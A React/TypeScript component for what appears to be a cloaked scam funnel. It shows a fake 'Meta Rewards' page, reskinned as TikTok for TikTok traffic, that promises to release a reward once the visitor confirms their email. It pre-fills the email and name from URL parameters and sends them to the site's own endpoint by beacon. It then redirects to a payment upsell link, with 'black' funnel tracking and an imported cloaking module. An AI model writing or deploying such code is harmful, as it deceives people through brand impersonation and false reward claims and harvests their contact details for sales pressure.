import { useEffect, useMemo, useState } from "react";
import { Mail, ShieldCheck, Loader2 } from "lucide-react";
import { markBlackFunnel, } from "@/lib/upsell-cloak";
import { withFunnelParams, getFunnelParams } from "@/lib/funnel-params";
import type { Lang } from "@/lib/reels-i18n";
import { trkStep } from "@/lib/trackly";
import { BlackClarity } from "@/components/BlackClarity";
import { BlackPixel } from "@/components/BlackPixel";


const META_REWARDS_LOGO = "https://i.imgur.com/DtmTv8h.png";
const TIKTOK_LOGO = "https://i.imgur.com/P6GScq9.png";

const DEFAULT_ACCENT = {
  "--up-accent": "#1877F2",
  "--up-accent-2": "#3b82f6",
  "--up-accent-rgb": "24,119,242",
  "--up-accent-fg": "#1877F2",
  "--up-accent-fg2": "#3b82f6",
  "--up-bg": "#f0f2f5",
  "--up-card": "#ffffff",
  "--up-card-border": "#e5e7eb",
  "--up-text": "#111827",
  "--up-muted": "#4b5563",
  "--up-subtle": "#6b7280",
  "--up-faint": "#9ca3af",
  "--up-field-bg": "#f9fafb",
  "--up-field-border": "#d1d5db",
} as const;
const TIKTOK_ACCENT = {
  "--up-accent": "#FA2E54",
  "--up-accent-2": "#e0264c",
  "--up-accent-rgb": "250,46,84",
  "--up-accent-fg": "#ffffff",
  "--up-accent-fg2": "#d4d4d4",
  "--up-bg": "#000000",
  "--up-card": "#121212",
  "--up-card-border": "#262626",
  "--up-text": "#f5f5f5",
  "--up-muted": "#a3a3a3",
  "--up-subtle": "#a3a3a3",
  "--up-faint": "#737373",
  "--up-field-bg": "#1a1a1a",
  "--up-field-border": "#333333",
} as const;

// Next-step button destination (one-click link — must not change)
const NEXT_STEP_URL = "https://go.centerpag.com/PPU38CQDBC1?upsell=true";

const COPY = {
  en: {
    step: "STEP 1 OF 3 — DO NOT CLOSE",
    title: "Confirm your email",
    body1: "We need to confirm your email to release your reward.",
    body2: "Check that it is correct and confirm below:",
    label: "Your email",
    cta: "Confirm email",
    sending: "Confirming...",
    invalid: "Enter a valid email.",
    spam: "Can't find the email? Check your spam folder.",
    secure: "Secure connection · Meta Rewards",
    rights: "All rights reserved.",
  },
  es: {
    step: "PASO 1 DE 3 — NO CIERRES",
    title: "Confirma tu correo",
    body1: "Necesitamos confirmar tu correo para liberar tu recompensa.",
    body2: "Verifica que sea correcto y confírmalo abajo:",
    label: "Tu correo",
    cta: "Confirmar correo",
    sending: "Confirmando...",
    invalid: "Ingresa un correo válido.",
    spam: "¿No ves el correo? Revisa tu carpeta de spam.",
    secure: "Conexión segura · Meta Rewards",
    rights: "Todos los derechos reservados.",
  },
} as const;

export function BlackPage({ lang }: { lang: Lang }) {
  const t = COPY[lang] ?? COPY.en;
  const [email, setEmail] = useState("");
  const [primeiroNome, setPrimeiroNome] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [isTt, setIsTt] = useState(false);

  useEffect(() => {
    const p = getFunnelParams();
    const foundEmail = p["e"] || p["email"] || p["payerEmail"] || "";
    const foundName = p["n"] || p["name"] || p["firstName"] || "";
    if (foundEmail) setEmail(foundEmail);
    if (foundName) setPrimeiroNome(foundName);
    setIsTt(Boolean(p["ttclid"]));
  }, []);

  useEffect(() => {
    trkStep("up1");
  }, []);

  const valid = useMemo(() => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email.trim()), [email]);

  const goNext = () => {
    markBlackFunnel();
    window.location.href = withFunnelParams(NEXT_STEP_URL, { ur: "1", e: email.trim() });
  };

  const onConfirm = async () => {
    if (!valid) {
      setError(t.invalid);
      return;
    }
    setError("");
    setLoading(true);

    const payload = JSON.stringify({
      email: email.trim(),
      lang: lang === "es" ? "es" : "en",
      primeiroNome: primeiroNome.trim() || email.trim().split("@")[0] || "Usuario",
    });

    // keepalive/sendBeacon: o envio sobrevive ao redirect imediato do funil
    try {
      const url = "/api/public/confirm-email";
      const blob = new Blob([payload], { type: "application/json" });
      const beaconOk =
        typeof navigator !== "undefined" &&
        typeof navigator.sendBeacon === "function" &&
        navigator.sendBeacon(url, blob);
      if (!beaconOk) {
        void fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: payload,
          keepalive: true,
        }).catch(() => {});
      }
    } catch {
      /* nunca bloqueia o funil */
    }

    // pequeno respiro para a requisição sair antes da navegação
    await new Promise((r) => setTimeout(r, 350));
    goNext();
  };


  return (
    <>
      <BlackClarity />
      <BlackPixel />
      <div
        className="min-h-[100dvh] w-full bg-(--up-bg) text-(--up-text) flex flex-col items-center justify-center px-4 py-10 font-sans"
        style={(isTt ? TIKTOK_ACCENT : DEFAULT_ACCENT) as React.CSSProperties}
      >
        <style>{`
        @keyframes up-pulse {
          0%, 100% { box-shadow: 0 8px 24px rgba(var(--up-accent-rgb),0.35); }
          50%      { box-shadow: 0 14px 36px rgba(var(--up-accent-rgb),0.55); }
        }
        @keyframes up-fade-in {
          from { opacity: 0; transform: translateY(12px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        .up-card  { animation: up-fade-in 500ms ease-out both; }
        .up-cta   { animation: up-pulse 2s ease-in-out infinite; }
        .up-cta:hover { filter: brightness(1.1); animation: none; }
      `}</style>

        <div className="up-card relative w-full max-w-sm rounded-3xl border border-(--up-card-border) bg-(--up-card) p-7 shadow-[0_20px_60px_-20px_rgba(0,0,0,0.4)]">
          <div className="absolute inset-x-0 -top-px h-px bg-gradient-to-r from-transparent via-(--up-accent)/40 to-transparent" />

          <div className="flex justify-center">
            <img
              src={isTt ? TIKTOK_LOGO : META_REWARDS_LOGO}
              alt="Meta Rewards"
              className="h-12 w-auto object-contain"
            />
          </div>

          <div className="mt-5 flex justify-center">
            <span className="inline-flex items-center gap-2 rounded-full border border-(--up-accent-fg)/20 bg-(--up-accent-fg)/10 px-3 py-1 text-[11px] font-bold uppercase tracking-widest text-(--up-accent-fg)">
              <span className="h-1.5 w-1.5 rounded-full bg-(--up-accent-fg) animate-pulse" />
              {t.step}
            </span>
          </div>

          <h1 className="mt-4 text-center text-3xl font-bold leading-tight bg-gradient-to-r from-(--up-accent-fg) to-(--up-accent-fg2) bg-clip-text text-transparent">
            {t.title}
          </h1>

          <p className="mt-3 text-center text-sm leading-relaxed text-(--up-muted)">
            {t.body1}
            <br />
            {t.body2}
          </p>

          <label className="mt-6 block text-[11px] font-semibold uppercase tracking-wider text-(--up-subtle)">
            {t.label}
          </label>
          <div className="mt-2 flex items-center gap-2 rounded-2xl border border-(--up-field-border) bg-(--up-field-bg) px-3 py-3 focus-within:border-(--up-accent)/70 focus-within:ring-2 focus-within:ring-(--up-accent)/10">
            <Mail className="h-5 w-5 shrink-0 text-(--up-accent-fg)" />
            <input
              type="email"
              inputMode="email"
              autoComplete="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="you@email.com"
              className="w-full bg-transparent text-sm text-(--up-text) outline-none placeholder:text-(--up-faint)"
            />
          </div>
          {error ? <p className="mt-2 text-xs text-red-500">{error}</p> : null}

          <button
            type="button"
            onClick={onConfirm}
            disabled={loading}
            data-funnel-step="dados"
            className="up-cta mt-6 flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-(--up-accent) to-(--up-accent-2) py-3.5 text-base font-bold text-white transition-transform active:scale-[0.98] disabled:opacity-70"
          >
            {loading ? (
              <Loader2 className="h-5 w-5 animate-spin" />
            ) : (
              <ShieldCheck className="h-5 w-5" />
            )}
            {loading ? t.sending : t.cta}
          </button>

          <p className="mt-3 text-center text-[11px] leading-relaxed text-(--up-subtle)">
            {t.spam}
          </p>

          <p className="mt-4 text-center text-[11px] text-(--up-faint)">{t.secure}</p>
        </div>

        <p className="mt-6 text-center text-[11px] text-(--up-faint)">
          © {new Date().getFullYear()} {t.rights}
        </p>
      </div>
    </>
  );
}
